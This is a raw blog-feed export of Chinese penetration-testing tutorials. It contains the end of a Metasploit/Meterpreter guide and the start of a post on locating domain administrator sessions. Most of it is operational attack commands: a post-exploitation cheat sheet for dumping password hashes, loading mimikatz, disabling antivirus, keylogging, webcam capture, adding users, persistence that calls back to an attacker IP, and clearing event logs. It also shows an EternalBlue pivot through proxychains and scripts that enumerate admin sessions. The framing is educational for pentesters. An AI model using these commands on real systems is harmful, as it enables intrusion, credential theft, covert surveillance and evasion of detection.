列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable_unicode_encoding      禁用 unicode 字符串的编码<br>enable_unicode_encoding       启用 unicode 字符串的编码<br><span class="hljs-built_in">exit</span>                          终止 Meterpreter 会话<br>get_timeouts                  获取当前会话超时值<br>guid                          获取会话 GUID<br><span class="hljs-built_in">help</span>                          帮助菜单<br>info                          显示有关 Post 模块的信息<br>irb                           在当前会话中打开一个交互式 Ruby shell<br>load                          加载一个或多个 Meterpreter 扩展<br>machine_id                    获取连接到会话的机器的 MSF ID<br>migrate                       将服务器迁移到另一个进程<br>pivot                         管理枢轴侦听器<br>pry                           在当前会话上打开 Pry 调试器<br>quit                          终止 Meterpreter 会话<br><span class="hljs-built_in">read</span>                          从通道读取数据<br>resource                      运行存储在文件中的命令<br>run                           执行一个 Meterpreter 脚本或 Post 模块<br>secure                       （重新）协商会话上的 TLV 数据包加密<br>sessions                      快速切换到另一个会话<br>set_timeouts                  设置当前会话超时值<br><span class="hljs-built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话<br>ssl_verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br>-------                       ------------<br><span class="hljs-built_in">cat</span>                           将文件内容读到屏幕上<br><span class="hljs-built_in">cd</span>                            切换目录<br>checksum                      检索文件的校验和<br><span class="hljs-built_in">cp</span>                            将源复制到目标<br>del                           删除指定文件<br><span class="hljs-built_in">dir</span>                           列出文件（<span class="hljs-built_in">ls</span> 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br><span class="hljs-built_in">ls</span>                            列出文件<br><span class="hljs-built_in">mkdir</span>                         制作目录<br><span class="hljs-built_in">mv</span>                            将源移动到目标<br><span class="hljs-built_in">pwd</span>                           打印工作目录<br><span class="hljs-built_in">rm</span>                            删除指定文件<br><span class="hljs-built_in">rmdir</span>                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>clearev                       清除事件日志<br>drop_token                    放弃任何活动的模拟令牌。<br>execute                       执行命令<br>getenv                        获取一个或多个环境变量值<br>getpid                        获取当前进程标识符<br>getprivs                      尝试启用当前进程可用的所有权限<br>getid                         获取服务器运行的用户的 SID<br>getuid                        获取服务器运行的用户<br><span class="hljs-built_in">kill</span>                          终止进程<br>localtime                     显示目标系统本地日期和时间<br>pgrep                         按名称过滤进程<br>pkill                         按名称终止进程<br>ps                            列出正在运行的进程<br>reboot                        重启远程计算机<br>reg                           修改远程注册表并与之交互<br>rev2self                      在远程机器上调用 RevertToSelf()<br>shell                         放入系统命令 shell<br>shutdown                      关闭远程计算机<br>steal_token                   尝试从目标进程窃取模拟令牌<br><span class="hljs-built_in">suspend</span>                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard_send                 发送击键<br>keyevent                      发送按键事件<br>keyscan_dump                  转储击键缓冲区<br>keyscan_start                 开始捕获击键<br>keyscan_stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>record_mic                    从默认麦克风录制音频 X 秒<br>webcam_chat                   开始视频聊天<br>webcam_list                   列出网络摄像头<br>webcam_snap                   从指定的网络摄像头拍摄快照<br>webcam_stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>timestomp                     操作文件 MACE 属性<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell         <span class="hljs-comment">#获取目标主机的cmd_shell权限</span><br>chcp 65001    <span class="hljs-comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205853047.png" alt="image-20240107205853047"></p><p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code>:</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205915153.png" alt="image-20240107205915153"></p><p>从<code>meterpreter</code>退出到<code>MSF框架</code>:<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">background   <span class="hljs-comment">#把我们获得的meterpreter会话挂载到后台运行</span><br></code></pre></td></tr></table></figure><p>查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：<br>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions  -l    <span class="hljs-comment">#查看获得的meterpreter_shell会话列表</span><br></code></pre></td></tr></table></figure><p>输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210018273.png" alt="image-20240107210018273"></p><p>输入：shell即可进入 cmd 类型的控制，再输入：powershell，即可进入 powershell 类型的控制台:</p><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210038608.png" alt="image-20240107210038608"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysinfo             <span class="hljs-comment">#查看目标主机系统信息</span><br>run scraper         <span class="hljs-comment">#查看目标主机详细信息</span><br>run hashdump        <span class="hljs-comment">#导出密码的哈希</span><br>load kiwi           <span class="hljs-comment">#加载mimikatz</span><br>ps                  <span class="hljs-comment">#查看目标主机进程信息</span><br><span class="hljs-built_in">pwd</span>                 <span class="hljs-comment">#查看目标当前目录(windows)</span><br>getlwd              <span class="hljs-comment">#查看目标当前目录(Linux)</span><br>search -f *.jsp -d e:\                <span class="hljs-comment">#搜索E盘中所有以.jsp为后缀的文件</span><br>download  e:\test.txt  /root          <span class="hljs-comment">#将目标机的e:\test.txt文件下载到/root目录下</span><br>upload    /root/test.txt d:\<span class="hljs-built_in">test</span>      <span class="hljs-comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br>getpid             <span class="hljs-comment">#查看当前Meterpreter Shell的进程PID</span><br>migrate 1384        <span class="hljs-comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br>idletime            <span class="hljs-comment">#查看主机运行时间</span><br>getuid              <span class="hljs-comment">#查看获取的当前权限</span><br>getsystem           <span class="hljs-comment">#提权,获得的当前用户是administrator才能成功</span><br>run  killav         <span class="hljs-comment">#关闭杀毒软件</span><br>screenshot          <span class="hljs-comment">#截图</span><br>webcam_list         <span class="hljs-comment">#查看目标主机的摄像头</span><br>webcam_snap         <span class="hljs-comment">#拍照</span><br>webcam_stream       <span class="hljs-comment">#开视频</span><br>execute 参数 -f 可执行文件       <span class="hljs-comment">#执行可执行程序</span><br>run getgui -u test1 -p Abc123456    <span class="hljs-comment">#创建test1用户，密码为Abc123456</span><br>run getgui -e                <span class="hljs-comment">#开启远程桌面</span><br>keyscan_start                <span class="hljs-comment">#开启键盘记录功能</span><br>keyscan_dump                 <span class="hljs-comment">#显示捕捉到的键盘记录信息</span><br>keyscan_stop                 <span class="hljs-comment">#停止键盘记录功能</span><br>uictl  <span class="hljs-built_in">disable</span>  keyboard     <span class="hljs-comment">#禁止目标使用键盘</span><br>uictl  <span class="hljs-built_in">enable</span>   keyboard     <span class="hljs-comment">#允许目标使用键盘</span><br>uictl  <span class="hljs-built_in">disable</span>  mouse        <span class="hljs-comment">#禁止目标使用鼠标</span><br>uictl  <span class="hljs-built_in">enable</span>   mouse        <span class="hljs-comment">#允许目标使用鼠标</span><br>load                        <span class="hljs-comment">#使用扩展库</span><br>run             <span class="hljs-comment">#使用扩展库</span><br> <br>run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <span class="hljs-comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span><br>portfwd add -l 9999 -r 192.168.100.158 -p 3389     <span class="hljs-comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>clearev                       <span class="hljs-comment">#清除日志</span><br></code></pre></td></tr></table></figure></li><li><h6 id="Post-后渗透模块"><a href="#Post-后渗透模块" class="headerlink" title="Post 后渗透模块"></a>Post 后渗透模块</h6><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate                <span class="hljs-comment">#自动进程迁移</span><br>run post/windows/gather/checkvm                <span class="hljs-comment">#查看目标主机是否运行在虚拟机上</span><br>run post/windows/manage/killav                <span class="hljs-comment">#关闭杀毒软件</span><br>run post/windows/manage/enable_rdp            <span class="hljs-comment">#开启远程桌面服务</span><br>run post/windows/manage/autoroute              <span class="hljs-comment">#查看路由信息</span><br>run post/windows/gather/enum_logged_on_users    <span class="hljs-comment">#列举当前登录的用户</span><br>run post/windows/gather/enum_applications       <span class="hljs-comment">#列举应用程序</span><br>run post/windows/gather/credentials/windows_autologin <span class="hljs-comment">#抓取自动登录的用户名和密码</span><br>run post/windows/gather/smart_hashdump               <span class="hljs-comment">#dump出所有用户的hash</span><br></code></pre></td></tr></table></figure><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境：<br>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210350087.png" alt="image-20240107210350087"></p><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run  killav<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210422413.png" alt="image-20240107210422413"></p><p>获取目标主机的详细信息</p><p>命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run scraper <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210505550.png" alt="image-20240107210505550"></p><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p></li></ul><h6 id="上传-x2F-下载文件"><a href="#上传-x2F-下载文件" class="headerlink" title="上传&#x2F;下载文件"></a>上传&#x2F;下载文件</h6><p>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">download  file <span class="hljs-comment">#命令可以帮助我们从目标系统中下载文件</span><br></code></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload  file  <span class="hljs-comment">#命令则能够向目标系统上传文件。</span><br></code></pre></td></tr></table></figure><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">getuid<br><span class="hljs-comment">#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</span><br>getsystem<br><span class="hljs-comment">#自动提权为系统权限</span><br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210650338.png" alt="image-20240107210650338"></p><p>  注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p><h5 id="运行程序："><a href="#运行程序：" class="headerlink" title="运行程序："></a>运行程序：</h5><p>  先查看目标主机安装了哪些应用：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_applications  <span class="hljs-comment">#查看目标主机安装了哪些应用</span><br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210722073.png" alt="image-20240107210722073"></p><p>  在meterpreter_shell命令行执行目标系统中的应用程序：<br>  命令:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#execute命令用法：</span><br>execute [参数] -f 指定的可执行文件<br><br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t：使用当前伪造的线程令牌运行进程<br>-s：在给定会话中执行进程<br></code></pre></td></tr></table></figure><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107210807916.png" alt="image-20240107210807916"></p><p>  开启远程桌面：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/manage/enable_rdp<br></code></pre></td></tr></table></figure><p>  先查看目标主机有哪些用户：<br>  命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run post/windows/gather/enum_logged_on_users  <span class="hljs-comment">#查看目标主机有用户</span><br></code></pre></td></tr></table></figure><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>  1、配置路由</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#配置静态路由让这个session3来转发访问192.168.52.0/24这个网段的所有流量``msf &gt; run autoroute -s 192.168.52.0/24</span><br></code></pre></td></tr></table></figure><p>  2、使用background命令将该shell放在后台，使用route print查看配置是否成功</p><p>  3、msf开启sock4代理</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf &gt; use auxiliary/server/socks_proxy<br>msf &gt; <span class="hljs-built_in">set</span> version 4a<br>msf &gt; <span class="hljs-built_in">set</span> srvhost 192.168.118.128&lt;br&gt;<br>msf &gt; <span class="hljs-built_in">set</span> srvport 1080<br>msf &gt; exploit<br></code></pre></td></tr></table></figure><p>  此时已经开启代理监听在1080端口</p><p>  4、修改&#x2F;etc&#x2F;proxychains4.conf文件，即proxychains配置文件</p><p>  <img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107211506563.png" alt="image-20240107211506563"></p><h4 id="portfwd端口转发"><a href="#portfwd端口转发" class="headerlink" title="portfwd端口转发"></a>portfwd端口转发</h4><p>  portfwd是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听，使用方法如下:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd add -l 9999 -r 192.168.100.158 -p 3389   <br><span class="hljs-comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>-l:   <span class="hljs-comment">#本地监听的端口，用于接收目标主机的端口反弹</span><br>-p:   <span class="hljs-comment">#目标服务器的端口；</span><br>add:  <span class="hljs-comment">#添加一个连接</span><br></code></pre></td></tr></table></figure><p>  然后我们只要访问本地的3389端口就可以连接到目标主机的3389端口了:</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop 127.0.0.1:9999<br><span class="hljs-comment">#因为通过端口转发功能已经把3389的流量转发到本地的9999端口，所以只要连接本地的9999端口就相当于连接了目标机器的3389端口；</span><br></code></pre></td></tr></table></figure><p>  如果不想继续连接的话，可以删除当前建立的连接，执行以下命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   <br>delet:  <span class="hljs-comment">#删除一个连接</span><br></code></pre></td></tr></table></figure><h1 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a><strong>实战演示</strong></h1><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183413048.png" alt="image-20240107183413048"></p><ul><li>通过永恒之蓝拿到跳板机<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183420867.png" alt="image-20240107183420867"></li><li>拿到跳板机之后添加路由<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183430002.png" alt="image-20240107183430002"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">添加攻击IP添加到目标机路由表中<br><br>也可以 run autoroute -s 10.10.10.0/24<br><br>或者手动添加<br><br>route add 10.10.10.0 255.255.255.0<br></code></pre></td></tr></table></figure><ul><li>接下来设置代理<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183438812.png" alt="image-20240107183438812"></li></ul><p>接下来用kali上的神奇proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183447125.png" alt="image-20240107183447125"><br>测试是否能连内网的机器<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183455089.png" alt="image-20240107183455089"><br>可以成功连接<br>通过代理工具开启msf<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183506484.png" alt="image-20240107183506484"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p><p>msf中有很多  攻击载荷模块，嗅探模块和后渗透模块。大家后期可以深入的去研究研究。</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找域管理员进程</title>
    <link href="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/"/>
    <url>/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><p>现在我们来假设一种情况：渗透测试人员在某个内网环境中获得一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道哪些用户登录了这台服务器。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找账户在内网的哪台机器上具有管理权限，再枚举这台机器上的用户，然后继续进行渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。</p><p><strong>1.1本机检查</strong></p><ul><li>获取域管理员列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154344780.png" alt="image-20240107154344780"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist  /v<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154353749.png" alt="image-20240107154353749">列入箭头所指如果为管理员那就可做令牌劫持拿到管理员权限</p><p><strong>1.2 查询域控制器的域用户会话</strong><br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><ul><li>查询域控制器列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br></code></pre></td></tr></table></figure><ul><li>收集域管理员列表<br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154402579.png" alt="image-20240107154402579"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154411641.png" alt="image-20240107154411641"></p><ul><li>收集所有活动域的会话列表</li></ul><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。<br><img src="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/image-20240107154432148.png" alt="image-20240107154432148"><br>有会话才有信息，否则就没有</p><ul><li>交叉引用域管理员列表与活动会话列表</li></ul><p>对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br>net localgroup <span class="hljs-string">&quot;Domian Admins&quot;</span> /domain &gt; admins.txt<br></code></pre></td></tr></table></figure><p>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; FOR /F %a <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> sessions.txt | @findstr /I %a<br></code></pre></td></tr></table></figure><p><img 